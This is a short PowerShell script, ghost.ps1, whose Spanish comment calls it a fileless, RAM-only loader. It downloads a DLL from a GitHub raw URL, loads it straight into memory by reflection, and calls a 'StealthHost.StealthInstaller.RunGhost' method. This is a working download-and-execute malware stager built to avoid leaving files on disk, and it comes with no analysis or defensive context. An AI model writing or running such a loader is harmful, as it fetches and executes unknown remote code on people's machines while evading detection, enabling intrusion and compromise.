# ghost.ps1 - Carga en RAM absoluta (Fileless)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sysm.dll"
$bytes = (New-Object System.Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$class = $assembly.GetType("StealthHost.StealthInstaller")
$method = $class.GetMethod("RunGhost")
$method.Invoke($null, $null)
